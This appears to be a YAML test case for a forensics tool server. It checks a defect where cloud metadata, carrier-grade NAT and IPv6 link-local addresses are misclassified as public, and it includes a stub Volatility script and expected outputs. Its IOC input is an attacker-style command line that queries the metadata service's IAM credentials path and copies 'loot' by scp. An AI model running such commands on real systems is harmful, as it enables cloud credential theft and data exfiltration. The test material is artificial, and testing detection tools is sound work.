# Matrix case P4116-017: _is_rfc1918 only knows the IPv4 private ranges and
# 127/8, so link-local 169.254/16 (cloud metadata) and carrier-grade NAT
# 100.64/10 are classified as public. Step 1 uses extract_iocs
# (threat_intel._is_rfc1918). Step 2 uses analyze_memory_network, which has
# its own copy (linux_memory._is_rfc1918) that also returns False for every
# IPv6 address.
# For step 2, vol is a stub (FINDEVIL_VOL) that prints linux.sockstat.Sockstat
# rows in Volatility 3's "-r json" form (list of objects with "Family",
# "Proto", "Source Addr", "Source Port", "Destination Addr",
# "Destination Port", "State", ...). External tool output is simulated.
# The connections are what a cloud VM normally has: cloud-init talking to the
# metadata service and an IPv6 link-local peer.
case_id: P4116-017
problem: P4116
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: response
level: mcp
realism: common
realism_ko: "클라우드 VM의 메타데이터 서비스 연결과 IPv6 링크 로컬 연결은 흔하다. Volatility 출력은 흉내 낸 것이다."
coverage: full
summary: extract_iocs puts the cloud metadata address 169.254.169.254 and the carrier-grade NAT address 100.64.0.5 under "ipv4 public", although neither is routable on the internet, and analyze_memory_network flags connections to the metadata service and to an IPv6 link-local peer as outbound non-RFC1918, so the model treats them as external IOCs to pivot on.
summary_ko: "`extract_iocs`는 클라우드 메타데이터 주소 169.254.169.254와 통신사급 NAT 주소 100.64.0.5를 \"ipv4 public\" 아래에 두는데, 둘 다 인터넷에서 라우팅되지 않는다. `analyze_memory_network`도 메타데이터 서비스와 IPv6 링크 로컬 상대와의 연결을 outbound non-RFC1918로 표시한다."
defect_ko: "이 서버는 IPv4 사설 대역과 127만 사설로 본다. 169.254/16, 100.64/10, IPv6 링크 로컬도 공인 주소가 아니다. 모델은 메타데이터 서비스와 링크 로컬 상대를 외부 IOC로 잘못 안다."
setup_ko: "메타데이터·CGNAT 주소가 든 글을 넣고, Volatility 대역이 메타데이터 서비스와 IPv6 링크 로컬 연결을 돌려주게 했다."
env:
  FINDEVIL_VOL: ${STUBS}/vol
stubs:
  - name: vol
    text: |
      #!/bin/sh
      if [ "$1" = "--help" ]; then echo "usage: vol [-h] [-f FILE] PLUGIN"; exit 0; fi
      case "$*" in
        *linux.sockstat.Sockstat*)
          cat <<'JSON'
      [{"NetNS": 4026531840, "Process Name": "cloud-init", "PID": 612, "TID": 612, "FD": 5, "Sock Offset": 18446616593423011840, "Family": "AF_INET", "Type": "STREAM", "Proto": "TCP", "Source Addr": "10.0.0.8", "Source Port": 48812, "Destination Addr": "169.254.169.254", "Destination Port": 80, "State": "ESTABLISHED", "Filter": "-", "__children": []},
       {"NetNS": 4026531840, "Process Name": "chronyd", "PID": 540, "TID": 540, "FD": 7, "Sock Offset": 18446616593423015936, "Family": "AF_INET6", "Type": "STREAM", "Proto": "TCP", "Source Addr": "fe80::5054:ff:fe12:3456", "Source Port": 51000, "Destination Addr": "fe80::1", "Destination Port": 4460, "State": "ESTABLISHED", "Filter": "-", "__children": []}]
      JSON
          exit 0;;
      esac
      echo "[]"
      exit 0
fixture:
  - path: mem/host.lime
    hex: 454d694c0100000000000000000000000000000000000000
steps:
  - tool: extract_iocs
    note_ko: "결함 호출: 글에서 IOC 추출"
    args:
      text: "curl -s http://169.254.169.254/latest/meta-data/iam/ ; ssh admin@100.64.0.5 ; scp loot 10.0.0.8:/tmp/"
  - tool: analyze_memory_network
    note_ko: "결함 호출: 메모리 네트워크 분석"
    args:
      memory_dump_path: ${EVIDENCE}/mem/host.lime
expect:
  - step: 1
    note_ko: "CGNAT·메타데이터 주소가 공인 IPv4로 분류된다"
    regex: "## ipv4 public \\(2\\)\\n- `100\\.64\\.0\\.5`\\n- `169\\.254\\.169\\.254`"
  - step: 1
    note_ko: "사설 IP는 제대로 사설로 분류된다"
    regex: "## ipv4 private \\(1\\)\\n- `10\\.0\\.0\\.8`"
  - step: 2
    note_ko: "메타데이터 서비스 연결이 외부 연결로 표시된다"
    contains: "outbound TCP to 169.254.169.254:80 (non-RFC1918, state=ESTABLISHED)"
  - step: 2
    note_ko: "IPv6 링크 로컬 연결이 외부 연결로 표시된다"
    contains: "outbound TCP to fe80::1:4460 (non-RFC1918, state=ESTABLISHED)"
